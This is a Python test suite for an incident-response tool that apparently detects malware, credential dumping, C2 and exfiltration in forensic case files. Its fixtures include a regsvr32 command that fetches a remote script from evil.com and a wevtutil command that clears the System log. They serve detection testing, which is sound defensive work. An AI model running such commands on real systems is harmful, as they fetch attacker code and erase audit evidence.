"""
NEXUS-IR Unit Test Suite
Tests all agents, devil advocate, behavioral overrides, and pipeline integrity.
Run with: python3 tests/test_nexus.py
"""
import sys, os, json, tempfile, shutil
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

PASS = 0
FAIL = 0

def check(name, condition, detail=''):
    global PASS, FAIL
    if condition:
        print(f'  [PASS] {name}')
        PASS += 1
    else:
        print(f'  [FAIL] {name}' + (f' -- {detail}' if detail else ''))
        FAIL += 1

def section(title):
    print('\n' + '='*55)
    print('  ' + title)
    print('='*55)

MALWARE_CASE   = '/data/data/com.termux/files/home/cases/obfuscated_malware'
FINANCIAL_CASE = '/data/data/com.termux/files/home/cases/financial_breach'
RANSOMWARE_CASE= '/data/data/com.termux/files/home/cases/ransomware'
BRUTE_CASE     = '/data/data/com.termux/files/home/cases/brute_force'

# ════════════════════════════════════════════════
section('TEST 1: TriageAgent')
from agents.triage_agent import TriageAgent
t = TriageAgent()
r = t.run(MALWARE_CASE)
check('TriageAgent returns COMPLETE status', r['status'] == 'COMPLETE')
check('TriageAgent finds files', r['total_files'] > 0)
check('TriageAgent sets CRITICAL priority for malware case', r['priority'] == 'CRITICAL')
check('TriageAgent builds investigation plan', len(r['investigation_plan']) > 0)
check('TriageAgent hashes files for CoC', len(r['file_hashes']) > 0)
check('TriageAgent finds critical keywords', len(r['keyword_hits'].get('critical_keywords_found', [])) > 0)
t2 = TriageAgent()
r2 = t2.run(BRUTE_CASE)
check('TriageAgent sets HIGH priority for brute force case', r2['priority'] == 'HIGH')

# ════════════════════════════════════════════════
section('TEST 2: LogAgent')
from agents.log_agent import LogAgent
la = LogAgent()
lr = la.run(MALWARE_CASE)
check('LogAgent returns COMPLETE status', lr['status'] == 'COMPLETE')
check('LogAgent analyzes files', lr['log_files_analyzed'] > 0)
check('LogAgent extracts IPv4 addresses', len(lr['extracted_iocs']['ipv4_addresses']) > 0)
check('LogAgent extracts granted_access 0x1FFFFF', '0x1FFFFF' in lr['extracted_iocs']['granted_access'])
check('LogAgent extracts base64 strings', len(lr['extracted_iocs']['base64_strings']) > 0)
check('LogAgent extracts process IDs', len(lr['extracted_iocs']['process_ids']) > 0)
check('LogAgent produces chain of custody', len(lr['chain_of_custody']) > 0)
check('LogAgent CoC contains SHA256 hashes', all('sha256' in v for v in lr['chain_of_custody'].values()))
check('LogAgent decoded at least one base64 payload', len(lr['decoded_payloads']) > 0)
check('LogAgent has no errors', len(lr['errors']) == 0)
la2 = LogAgent()
lr2 = la2.run(MALWARE_CASE)
all_hits = lr2.get('hits', {})
json_tool_used = any(
    hit.get('tool_used') == 'json_parser'
    for file_hits in all_hits.values()
    for hit in file_hits.values()
    if isinstance(hit, dict)
)
check('LogAgent uses JSON parser for .json files', json_tool_used)

# ════════════════════════════════════════════════
section('TEST 3: DiskAgent')
from agents.disk_agent import DiskAgent
da = DiskAgent()
dr = da.run(FINANCIAL_CASE)
check('DiskAgent returns COMPLETE status', dr['status'] == 'COMPLETE')
check('DiskAgent analyzes files', dr['files_analyzed'] > 0)
check('DiskAgent detects malicious filenames', len(dr['extracted_iocs']['malicious_filenames']) > 0)
check('DiskAgent detects mimikatz', 'mimikatz' in dr['extracted_iocs']['malicious_filenames'])
check('DiskAgent detects drop zones', len(dr['extracted_iocs']['drop_zone_paths']) > 0)
check('DiskAgent sets CRITICAL priority', dr['priority'] == 'CRITICAL')
check('DiskAgent produces findings', len(dr['findings']) > 0)
check('DiskAgent CoC hashes all files', len(dr['chain_of_custody']) == dr['files_analyzed'])
check('All DiskAgent findings are traceable', all(f.get('traceable') for f in dr['findings']))

# ════════════════════════════════════════════════
section('TEST 4: MemoryAgent')
from agents.memory_agent import MemoryAgent
ma = MemoryAgent()
mr = ma.run(FINANCIAL_CASE)
check('MemoryAgent returns COMPLETE status', mr['status'] == 'COMPLETE')
check('MemoryAgent detects credential dumping', len(mr['extracted_iocs']['credential_dump_indicators']) > 0)
check('MemoryAgent detects lsass', 'lsass' in mr['extracted_iocs']['credential_dump_indicators'])
check('MemoryAgent detects mimikatz', 'mimikatz' in mr['extracted_iocs']['credential_dump_indicators'])
check('MemoryAgent detects golden ticket', 'golden ticket' in mr['extracted_iocs']['credential_dump_indicators'])
check('MemoryAgent sets CRITICAL priority', mr['priority'] == 'CRITICAL')
check('MemoryAgent findings have MITRE mappings', all('mitre' in f for f in mr['findings']))
check('All MemoryAgent findings are traceable', all(f.get('traceable') for f in mr['findings']))

# ════════════════════════════════════════════════
section('TEST 5: NetworkAgent')
from agents.network_agent import NetworkAgent
na = NetworkAgent()
nr = na.run(FINANCIAL_CASE)
check('NetworkAgent returns COMPLETE status', nr['status'] == 'COMPLETE')
check('NetworkAgent detects C2 indicators', len(nr['extracted_iocs']['c2_indicators']) > 0)
check('NetworkAgent detects beacon', 'beacon' in nr['extracted_iocs']['c2_indicators'])
check('NetworkAgent detects suspicious ports', len(nr['extracted_iocs']['suspicious_ports']) > 0)
check('NetworkAgent detects port 4444', '4444' in nr['extracted_iocs']['suspicious_ports'])
check('NetworkAgent detects exfiltration', len(nr['extracted_iocs']['exfil_indicators']) > 0)
check('NetworkAgent sets CRITICAL priority', nr['priority'] == 'CRITICAL')
check('All NetworkAgent findings are traceable', all(f.get('traceable') for f in nr['findings']))
na2 = NetworkAgent()
nr2 = na2.run(MALWARE_CASE)
check('NetworkAgent detects TLS anomaly (LE cert)', len(nr2['extracted_iocs']['tls_anomalies']) > 0)

# ════════════════════════════════════════════════
section('TEST 6: CorrelationAgent')
from agents.correlation_agent import CorrelationAgent
la3 = LogAgent()
lr3 = la3.run(MALWARE_CASE)
t3 = TriageAgent()
tr3 = t3.run(MALWARE_CASE)
all_reports_test = {'TriageAgent': tr3, 'LogAgent': lr3}
ca = CorrelationAgent()
cr = ca.run(all_reports_test)
check('CorrelationAgent returns COMPLETE status', cr['status'] == 'COMPLETE')
check('CorrelationAgent detects attack patterns', len(cr['attack_patterns']) > 0)
check('CorrelationAgent produces threat assessment', 'score' in cr['threat_assessment'])
check('CorrelationAgent scores malware case CRITICAL', cr['threat_assessment']['level'] == 'CRITICAL')
check('CorrelationAgent scores >= 90 for malware case', cr['threat_assessment']['score'] >= 90)
check('CorrelationAgent detects PROCESS_INJECTION', any(p['pattern'] == 'PROCESS_INJECTION' for p in cr['attack_patterns']))
check('CorrelationAgent extracts IP correlations', len(cr['ip_correlations']) > 0)
check('CorrelationAgent produces attack narrative', len(cr.get('attack_narrative', '')) > 0)
check('CorrelationAgent produces containment actions', len(cr.get('containment_actions', [])) > 0)

# ════════════════════════════════════════════════
section('TEST 7: CorrectionAgent + Devil Advocate')
from agents.correction_agent import CorrectionAgent
fake_triage_good = {
    'keyword_hits': {
        'critical_keywords_found': ['0x1fffff', 'createremotethread'],
        'high_keywords_found': []
    }
}
fake_corr_good = {
    'threat_assessment': {'score': 97, 'level': 'CRITICAL'},
    'attack_patterns': [
        {'pattern': 'PROCESS_INJECTION', 'evidence_keywords': ['0x1fffff'],
         'mitre_technique': 'T1055', 'description': 'Process injection', 'base_score': 97}
    ],
    'high_signal_signatures': [{'description': 'PROCESS_ALL_ACCESS', 'mitre': 'T1055', 'score': 95}],
    'ip_correlations': [{'ip': '104.21.55.12', 'significance': 'HIGH'}],
    'extracted_entities': {'granted_access': ['0x1FFFFF']}
}
corr_agent_good = CorrectionAgent()
rep_good = corr_agent_good.run({'LogAgent': {'findings': []}}, fake_corr_good, fake_triage_good)
check('CorrectionAgent passes clean case with no issues', len(rep_good['summary']['devil_advocate_issues']) == 0)
check('CorrectionAgent forced_reeval False for clean case', rep_good['summary']['forced_reeval'] == False)
fake_triage_bad = {
    'keyword_hits': {
        'critical_keywords_found': ['powershell', 'executionpolicy', 'windowstyle', 'bypass'],
        'high_keywords_found': []
    }
}
fake_corr_bad = {
    'threat_assessment': {'score': 50, 'level': 'MEDIUM'},
    'attack_patterns': [],
    'high_signal_signatures': [],
    'ip_correlations': [],
    'extracted_entities': {}
}
corr_agent_bad = CorrectionAgent()
rep_bad = corr_agent_bad.run({'LogAgent': {'findings': []}}, fake_corr_bad, fake_triage_bad)
check('Devil advocate fires on PS mismatch', len(rep_bad['summary']['devil_advocate_issues']) > 0)
check('Devil advocate sets forced_reeval True on mismatch', rep_bad['summary']['forced_reeval'] == True)
check('Auto-remediation injects POWERSHELL_OBFUSCATION', 'POWERSHELL_OBFUSCATION' in rep_bad['summary'].get('auto_remediated_patterns', []))
check('Auto-remediation count > 0', rep_bad['summary'].get('auto_remediation_count', 0) > 0)

# ════════════════════════════════════════════════
section('TEST 8: Behavioral Overrides')
sys.path.insert(0, '/data/data/com.termux/files/home/nexus-ir')
from main import _apply_behavioral_overrides, _read_case_files
tmp = tempfile.mkdtemp()
with open(os.path.join(tmp, 'test.log'), 'w') as f:
    f.write('regsvr32.exe /i:http://evil.com/payload.sct scrobj.dll\n')
fake_r1 = {'executive_summary': {'threat_level': 'LOW', 'threat_score': 10, 'attack_patterns_detected': 0}, 'attack_patterns': []}
res1 = _apply_behavioral_overrides(fake_r1, tmp)
check('T1218.010 fires on regsvr32+/i:http', res1['executive_summary']['threat_level'] == 'CRITICAL')
check('T1218.010 sets score to 85', res1['executive_summary']['threat_score'] == 85)
check('T1218.010 injects LOLBIN_INVASION pattern', any('LOLBIN_INVASION' in p['pattern'] for p in res1['attack_patterns']))
shutil.rmtree(tmp)
tmp2 = tempfile.mkdtemp()
with open(os.path.join(tmp2, 'test.log'), 'w') as f:
    f.write('wevtutil.exe cl System\n')
fake_r2 = {'executive_summary': {'threat_level': 'LOW', 'threat_score': 10, 'attack_patterns_detected': 0}, 'attack_patterns': []}
res2 = _apply_behavioral_overrides(fake_r2, tmp2)
check('T1070.001 fires on wevtutil+cl', res2['executive_summary']['threat_level'] == 'CRITICAL')
check('T1070.001 sets score to 90', res2['executive_summary']['threat_score'] == 90)
check('T1070.001 injects DEFENSE_EVASION pattern', any('DEFENSE_EVASION' in p['pattern'] for p in res2['attack_patterns']))
shutil.rmtree(tmp2)
tmp3 = tempfile.mkdtemp()
with open(os.path.join(tmp3, 'test.log'), 'w') as f:
    f.write('ICMP packet entropy 7.9 size 1400 to 45.33.100.1\n')
fake_r3 = {'executive_summary': {'threat_level': 'LOW', 'threat_score': 10, 'attack_patterns_detected': 0}, 'attack_patterns': []}
res3 = _apply_behavioral_overrides(fake_r3, tmp3)
check('T1095 fires on icmp+entropy', res3['executive_summary']['threat_level'] == 'CRITICAL')
check('T1095 injects ICMP_TUNNEL_EXFILTRATION pattern', any('ICMP' in p['pattern'] for p in res3['attack_patterns']))
shutil.rmtree(tmp3)

# ════════════════════════════════════════════════
section('TEST 9: End-to-End Pipeline Scores')
from langgraph_orchestrator import LangGraphOrchestrator
print('  Running obfuscated_malware case...')
o1 = LangGraphOrchestrator()
r1 = o1.investigate(MALWARE_CASE)
es1 = r1['executive_summary']
check('Malware case scores CRITICAL', es1['threat_level'] == 'CRITICAL')
check('Malware case scores >= 95', es1['threat_score'] >= 95)
check('Malware case has 0 rejected findings', es1['findings_rejected'] == 0)
check('Malware case chain of custody present', len(r1.get('chain_of_custody', {})) > 0)
check('Malware case execution trace present', len(r1.get('execution_trace', [])) > 0)
print('  Running brute_force case...')
o2 = LangGraphOrchestrator()
r2 = o2.investigate(BRUTE_CASE)
es2 = r2['executive_summary']
check('Brute force scores HIGH not over-escalated', es2['threat_level'] == 'HIGH')
check('Brute force score between 70-89', 70 <= es2['threat_score'] <= 89)
check('Brute force has 0 rejected findings', es2['findings_rejected'] == 0)
print('  Running financial_breach case...')
o3 = LangGraphOrchestrator()
r3 = o3.investigate(FINANCIAL_CASE)
es3 = r3['executive_summary']
check('Financial breach scores CRITICAL', es3['threat_level'] == 'CRITICAL')
check('Financial breach has >= 4 attack patterns', es3['attack_patterns_detected'] >= 4)
check('Financial breach detects C2 or exfil via NetworkAgent', any(
    'exfil' in str(p).lower() or 'c2' in str(p).lower()
    for p in r3.get('attack_patterns', [])
))

# ════════════════════════════════════════════════
print('\n' + '='*55)
print('  NEXUS-IR TEST SUITE COMPLETE')
print('='*55)
print('  PASSED : ' + str(PASS))
print('  FAILED : ' + str(FAIL))
print('  TOTAL  : ' + str(PASS + FAIL))
accuracy = round(PASS / (PASS + FAIL) * 100, 1) if (PASS + FAIL) > 0 else 0
print('  SCORE  : ' + str(accuracy) + '%')
print('='*55)
if FAIL == 0:
    print('  ALL TESTS PASSED -- ready for submission!')
else:
    print('  ' + str(FAIL) + ' test(s) failed -- review before submission')
sys.exit(0 if FAIL == 0 else 1)